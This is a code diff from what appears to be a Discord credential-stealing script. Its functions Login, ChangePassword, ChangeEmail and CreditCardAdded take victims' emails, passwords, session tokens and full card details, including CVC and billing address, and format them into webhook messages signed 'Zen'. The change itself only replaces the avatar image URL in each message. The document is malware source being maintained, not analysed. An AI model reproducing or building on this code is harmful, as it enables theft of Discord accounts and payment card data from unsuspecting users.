@@ -129,7 +129,7 @@ function Login(email, password, token) {
             var params = {
                 username: "Zen",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/896371473801953340/918101260530487336/cc629e8d012725ebf31225e6a48b3159.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
@@ -178,7 +178,7 @@ function ChangePassword(oldpassword, newpassword, token) {
             var params = {
                 username: "Zen",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/896371473801953340/918101260530487336/cc629e8d012725ebf31225e6a48b3159.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
@@ -231,7 +231,7 @@ function ChangeEmail(newemail, password, token) {
             var params = {
                 username: "Zen",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/896371473801953340/918101260530487336/cc629e8d012725ebf31225e6a48b3159.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
@@ -285,7 +285,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
             var params = {
                 username: "Zen",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/896371473801953340/918101260530487336/cc629e8d012725ebf31225e6a48b3159.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
